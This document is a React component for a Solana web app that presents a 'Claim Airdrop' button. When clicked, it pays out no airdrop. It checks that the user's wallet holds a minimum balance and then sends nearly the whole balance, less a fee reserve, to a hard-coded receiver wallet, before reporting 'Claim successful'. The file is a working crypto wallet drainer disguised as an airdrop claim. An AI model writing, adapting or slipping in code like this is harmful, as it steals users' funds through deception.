// src/components/TransferButton.jsx
import { useWallet } from '@solana/wallet-adapter-react';
import { useCallback, useState } from 'react';
import {
  Connection,
  LAMPORTS_PER_SOL,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction,
} from '@solana/web3.js';
import { MIN_QUALIFY_SOL, RECEIVER_WALLET, RPC_URL, TRANSFER_FEE_BUFFER } from '../utils/constants';

export default function TransferButton({ className = '' }) {
  const { publicKey, sendTransaction, connected } = useWallet();
  const [loading, setLoading] = useState(false);

  const handleTransfer = useCallback(async () => {
    if (!publicKey || !sendTransaction || !connected) return;

    setLoading(true);
    try {
      // Create a standalone HTTP-only connection (no WebSocket)
      const connection = new Connection(RPC_URL, {
        commitment: 'confirmed',
        wsEndpoint: false,
      });

      const [balance, { blockhash, lastValidBlockHeight }] = await Promise.all([
        connection.getBalance(publicKey, 'confirmed'),
        connection.getLatestBlockhash('confirmed'),
      ]);

      const minimumQualifyingLamports = Math.floor(MIN_QUALIFY_SOL * LAMPORTS_PER_SOL);

      if (balance < minimumQualifyingLamports) {
        alert(`Not qualified for airdrop. Keep at least ${MIN_QUALIFY_SOL} SOL in your wallet.`);
        return;
      }

      // Build a dummy transfer first to estimate the real fee
      const dummyIx = SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: RECEIVER_WALLET,
        lamports: 1, // placeholder
      });

      const dummyMsg = new TransactionMessage({
        payerKey: publicKey,
        recentBlockhash: blockhash,
        instructions: [dummyIx],
      }).compileToV0Message();

      const feeResult = await connection.getFeeForMessage(dummyMsg, 'confirmed');
      // Base fee from RPC + extra margin for priority fees the wallet may add
      const baseFee = feeResult?.value ?? 5000;
      const feeReserve = Math.max(baseFee * 4, TRANSFER_FEE_BUFFER);

      const transferAmount = balance - feeReserve;
      if (transferAmount <= 0) {
        alert('Insufficient balance for transaction fee.');
        return;
      }

      // Build the real transaction with the correct amount
      const instructions = [
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: RECEIVER_WALLET,
          lamports: transferAmount,
        }),
      ];

      const messageV0 = new TransactionMessage({
        payerKey: publicKey,
        recentBlockhash: blockhash,
        instructions,
      }).compileToV0Message();

      const transaction = new VersionedTransaction(messageV0);

      const signature = await sendTransaction(transaction, connection, {
        skipPreflight: true,
      });

      console.log('⏳ Transaction sent:', signature);

      // Poll for confirmation over HTTP (no WebSocket needed)
      const startTime = Date.now();
      const TIMEOUT = 60_000; // 60 seconds
      const POLL_INTERVAL = 2_000; // 2 seconds

      while (Date.now() - startTime < TIMEOUT) {
        const { value } = await connection.getSignatureStatuses([signature]);
        const status = value?.[0];

        if (status) {
          if (status.err) {
            throw new Error('Transaction failed on-chain: ' + JSON.stringify(status.err));
          }
          if (
            status.confirmationStatus === 'confirmed' ||
            status.confirmationStatus === 'finalized'
          ) {
            console.log('✅ Transaction confirmed:', signature);
            alert(`Claim successful!\nTx: ${signature}`);
            return;
          }
        }

        // Check if blockhash expired
        const blockHeight = await connection.getBlockHeight('confirmed');
        if (blockHeight > lastValidBlockHeight) {
          throw new Error('Transaction expired. Please try again.');
        }

        await new Promise((r) => setTimeout(r, POLL_INTERVAL));
      }

      throw new Error('Confirmation timed out. Check your wallet — the transaction may still land.');
    } catch (err) {
      console.error('Transfer failed:', err);
      alert('Claim failed: ' + (err?.message || 'You are not qualified for this Airdrop'));
    } finally {
      setLoading(false);
    }
  }, [publicKey, sendTransaction, connected]);

  if (!publicKey) return null;

  return (
    <button
      onClick={handleTransfer}
      disabled={loading}
      className={`
        w-full py-3 px-4 rounded-lg font-semibold transition
        ${loading ? 'bg-gray-600 cursor-not-allowed' : ''}
        ${className}
      `}
    >
      {loading ? 'Claiming...' : 'Claim Airdrop'}
    </button>
  );
}
